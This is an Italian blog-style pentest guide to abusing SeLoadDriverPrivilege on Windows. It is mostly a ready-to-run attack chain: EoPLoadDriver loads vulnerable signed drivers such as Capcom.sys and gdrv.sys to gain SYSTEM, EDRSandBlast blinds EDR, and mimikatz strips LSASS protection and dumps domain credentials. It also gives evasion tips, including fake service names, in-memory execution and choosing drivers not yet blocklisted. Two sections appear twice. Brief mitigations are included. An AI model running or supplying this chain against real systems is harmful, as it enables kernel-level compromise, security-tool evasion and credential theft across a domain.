---
title: 'SeLoadDriverPrivilege: Kernel Ring-0 con BYOVD in 3 passi'
slug: seloaddriverprivilege
description: >-
  SeLoadDriverPrivilege Enabled? Carica un driver vulnerabile nel kernel, esegui
  codice ring-0, disabilita EDR e bypassa PPL di LSASS. Guida BYOVD con
  Capcom.sys e EDRSandBlast.
image: /SeLoadDriverPrivilege.webp
draft: false
date: 2026-05-06T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - seloaddriverprivilege
  - byovd
  - kernel-exploitation
---

Hai SeLoadDriverPrivilege — magari come membro di Print Operators su un DC. In tre comandi carichi un driver firmato vulnerabile nel kernel, esegui codice ring-0 e bypasasi PPL di LSASS o disabiliti completamente l'EDR. L'unico privilegio di questa serie che porta a ring-0.

***

## Quick Exploit

```cmd
EoPLoadDriver.exe System\CurrentControlSet\CapcomDrv C:\tools\Capcom.sys
ExploitCapcom.exe
```

Output atteso:

```
nt authority\system
```

***

## Attack Chain

```
Account Print Operators / SeLoadDriverPrivilege
  → verifica HVCI: Get-ItemProperty HKLM:\...\DeviceGuard | Select-Object HVCI
  → EoPLoadDriver.exe System\CurrentControlSet\MySvc C:\tools\vulnerable.sys
  → exploit del driver → token SYSTEM kernel-side
  → OPPURE EDRSandBlast → EDR cieco → dump LSASS con PPL bypassato
```

***

## Tool Decision

| Obiettivo                      | Tool + driver                                                       |
| ------------------------------ | ------------------------------------------------------------------- |
| SYSTEM shell diretta           | `EoPLoadDriver` + `Capcom.sys` + `ExploitCapcom.exe`                |
| Disabilita EDR                 | `EDRSandBlast --driver gdrv.sys --disable-edr`                      |
| Kernel r/w generico            | `EoPLoadDriver` + `RTCore64.sys` (MSI Afterburner)                  |
| LSASS dump con PPL attivo      | `EDRSandBlast` rimuove PPL kernel-side, poi dump standard           |
| Driver non ancora in blocklist | Cerca su [loldrivers.io](https://www.loldrivers.io) per versione OS |

***

## Cos'è SeLoadDriverPrivilege

Permette di chiamare `NtLoadDriver()` per caricare e scaricare driver del kernel. A differenza di tutti gli altri privilegi di questa serie, qui non stai aggirando ACL o token — stai eseguendo codice **ring-0**, con accesso diretto alle strutture del kernel e a tutto ciò che gira in userland.

Il principio BYOVD: porti un driver legittimo e firmato con una vulnerabilità nota (read/write kernel memory o arbitrary execution), lo carichi tramite questo privilegio, poi sfrutti la vulnerabilità per eseguire codice arbitrario nel kernel.

Il gruppo **Print Operators** ha questo privilegio per default — incluso sui Domain Controller.

***

## Quando esiste

* **Print Operators** — assegnato per default, incluso sui DC
* **Account IT** con diritti di gestione driver
* **Service account** per VPN client, monitoring agent, security software

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeLoadDriverPrivilege    Load and unload device drivers    Enabled
```

Verifica se sei in Print Operators:

```cmd
net localgroup "Print Operators"
```

Chi ha il privilegio nel sistema:

```cmd
accesschk.exe -a SeLoadDriverPrivilege *
```

***

## Step 1 — Verifica HVCI (la principale mitigazione)

Prima di procedere, verifica se HVCI è attivo — blocca i driver revocati e quelli nella blocklist:

```powershell
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" | Select-Object HypervisorEnforcedCodeIntegrity
```

`1` = HVCI attivo → driver nella Microsoft Vulnerable Driver Blocklist bloccati. Se HVCI è attivo, cerca driver non ancora nella blocklist su [loldrivers.io](https://www.loldrivers.io).

***

## Step 2 — Carica il driver vulnerabile con EoPLoadDriver

`NtLoadDriver()` non è facilmente invocabile direttamente. **EoPLoadDriver** wrappa la syscall e funziona anche da account non-admin (es. Print Operators). Scaricabile da [TarlogicSecurity/EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver):

```cmd
EoPLoadDriver.exe System\CurrentControlSet\MySvc C:\tools\vulnerable.sys
```

Il primo parametro è il nome della chiave di registro che verrà creata per il servizio. Il secondo è il path del driver.

***

## Step 3 — Exploit kernel

### Con Capcom.sys — arbitrary kernel code execution

Capcom.sys è un driver firmato del produttore di giochi Capcom con una vulnerabilità che permette l'esecuzione arbitraria di codice nel kernel tramite un IOCTL non protetto.

Carica il driver:

```cmd
EoPLoadDriver.exe System\CurrentControlSet\CapcomDrv C:\tools\Capcom.sys
```

Poi esegui l'exploit che eleva il token del processo corrente a SYSTEM:

```cmd
ExploitCapcom.exe
```

Output:

```
nt authority\system
```

Source: [tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)

### Con RTCore64.sys — kernel r/w arbitrario

RTCore64.sys (MSI Afterburner) espone operazioni di lettura/scrittura nella memoria kernel tramite IOCTL. Usalo per token stealing:

```cmd
EoPLoadDriver.exe System\CurrentControlSet\RTCore64 C:\tools\RTCore64.sys
```

Poi usa un tool di token stealing basato su RTCore64 — cerca "RTCore64 token stealing" su GitHub per PoC aggiornati.

### Con EDRSandBlast — disabilita l'EDR a livello kernel

EDRSandBlast usa un driver BYOVD per localizzare e rimuovere le strutture kernel che l'EDR usa per i suoi callback (PsSetCreateProcessNotifyRoutine etc.) → EDR diventa cieco → procedi con dump/lateral movement senza detection. Scaricabile da [wavestone-cdt/EDRSandBlast](https://github.com/wavestone-cdt/EDRSandBlast):

```cmd
EDRSandBlast.exe --driver gdrv.sys --disable-edr
```

***

## Driver BYOVD più usati

|      Driver      | Vendor          | Vulnerabilità                   | Firmato |
| :--------------: | --------------- | ------------------------------- | ------- |
|   `Capcom.sys`   | Capcom          | Arbitrary kernel exec via IOCTL | ✅       |
|  `RTCore64.sys`  | MSI Afterburner | Kernel memory r/w               | ✅       |
|    `gdrv.sys`    | GIGABYTE        | Arbitrary memory r/w            | ✅       |
|  `AsrDrv10.sys`  | ASRock          | Kernel memory r/w               | ✅       |
| `dbutil_2_3.sys` | Dell            | CVE-2021-21551, r/w             | ✅       |

Lista completa aggiornata con hash SHA256 e CVE: [loldrivers.io](https://www.loldrivers.io)

***

## Scenario critico — Print Operators su DC

Questo è il caso più pericoloso e più ignorato nei security review. Come membro di Print Operators su DC01:

Prima verifica il privilegio:

```cmd
whoami /priv | findstr SeLoadDriver
```

Carica gdrv.sys:

```cmd
EoPLoadDriver.exe System\CurrentControlSet\GDrv C:\tools\gdrv.sys
```

Esegui il token stealing per SYSTEM — poi lsass dump con RunAsPPL bypassato a livello kernel:

```cmd
mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" exit
```

Risultato: tutti gli hash del dominio, PPL bypassato, nessun tool di dump userland necessario.

***

## Verifica driver caricati nel sistema

Per vedere tutti i driver attivi e cercare anomalie:

```cmd
driverquery /fo list /v | findstr "Name\|Path\|State"
```

Con Seatbelt (include firma e path):

```cmd
Seatbelt.exe Drivers
```

***

## Errori comuni

**`STATUS_INVALID_IMAGE_HASH`** — Firma revocata o HVCI attivo con blocklist aggiornata. Cerca un driver alternativo non ancora nella lista su [loldrivers.io](https://www.loldrivers.io).

**`STATUS_ACCESS_DENIED`** — Privilegio non Enabled. Verifica con `whoami /priv | findstr SeLoadDriver`.

**La versione del driver non corrisponde all'exploit** — Verifica l'hash SHA256 esatto: `certutil -hashfile Capcom.sys SHA256`. Usa solo la versione specifica per cui esiste il PoC.

**EoPLoadDriver fallisce con nome servizio già esistente** — Cambia il nome del servizio: `EoPLoadDriver.exe System\CurrentControlSet\MySvc2 C:\tools\driver.sys`.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                            | Come lo bypassa il Red Team                                                                           |
| --------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| Sysmon Event ID 6 — driver caricato da path anomalo | Copia il driver in `C:\Windows\System32\drivers\` prima del caricamento                               |
| Event ID 7045 — nuovo servizio installato           | Usa un nome servizio che imita servizi legittimi: `WindowsUpdateSvc`, `MsSecDrv`                      |
| Hash driver nella Vulnerable Driver Blocklist       | Usa driver non ancora nella lista — [loldrivers.io](https://www.loldrivers.io) aggiorna costantemente |
| EDRSandBlast detection comportamentale              | Esegui da memoria via `execute-assembly` invece che da file su disco                                  |

***

* **`STATUS_INVALID_IMAGE_HASH`** → firma revocata o HVCI attivo con blocklist aggiornata → cambia driver con uno non ancora nella lista
* **`STATUS_ACCESS_DENIED`** → privilegio non Enabled nel token
* La versione del driver non corrisponde all'exploit → verifica hash SHA256 esatto del file

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                      | Come lo bypassa il Red Team                                                       |
| --------------------------------------------- | --------------------------------------------------------------------------------- |
| Sysmon Event ID 6 — driver da path anomalo    | Copia il driver in `C:\Windows\System32\drivers\` prima del caricamento           |
| Event ID 7045 — nuovo servizio installato     | Usa nomi che imitano servizi legittimi: `WindowsUpdateSvc`, `MsSecDrv`            |
| Hash driver nella Vulnerable Driver Blocklist | Cerca driver non ancora nella lista su [loldrivers.io](https://www.loldrivers.io) |
| EDRSandBlast detection comportamentale        | Esegui da memoria via `execute-assembly` invece che da file su disco              |

***

## Mitigazioni

* **HVCI** — la mitigazione più forte: blocca driver revocati e non nella blocklist a livello hypervisor
* **Microsoft Vulnerable Driver Blocklist** — aggiornata automaticamente con Defender
* **Rimuovere Print Operators dai DC** se nessuno ne ha bisogno fisicamente per la stampa
* Monitorare Event ID 7045 per installazioni anomale di driver/servizi

**Nota realistica:** HVCI richiede hardware compatibile e configurazione esplicita — nella maggior parte dei server enterprise non è attivo. La blocklist è sempre in ritardo rispetto ai nuovi driver scoperti. Su server senza HVCI, BYOVD funziona con qualsiasi driver non ancora nella lista.

***

## FAQ

**Print Operators può davvero caricare driver?**
Sì — il privilegio esiste per i driver di stampa. Su un DC significa accesso kernel diretto. Questo gruppo viene sistematicamente ignorato nei security review.

**HVCI blocca tutti i driver BYOVD?**
Blocca quelli revocati e nella blocklist. Driver firmati non ancora nella lista esistono sempre — [loldrivers.io](https://www.loldrivers.io) tiene traccia di quelli noti.

**Funziona senza admin locale?**
Sì — SeLoadDriverPrivilege è sufficiente. Print Operators non sono admin locali ma possono caricare driver kernel.

***

SeLoadDriverPrivilege è l'unico privilegio di questa serie che porta a ring-0. Con BYOVD bypasasi PPL, EDR e qualsiasi controllo basato su hook userland — tutto il resto della serie opera in userland.

***

**Articoli correlati:**

* [SeDebugPrivilege](https://hackita.it/articoli/sedebugprivilege) — LSASS dump senza kernel (bloccato da PPL)
* [SeTcbPrivilege](https://hackita.it/articoli/setcbprivilege) — TCB e token creation avanzata

**Riferimenti:** [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver) · [LOLDrivers](https://www.loldrivers.io) · [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandBlast) · [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)

Per assessment su kernel security e BYOVD exposure: [hackita.it/supporto](https://hackita.it/supporto)
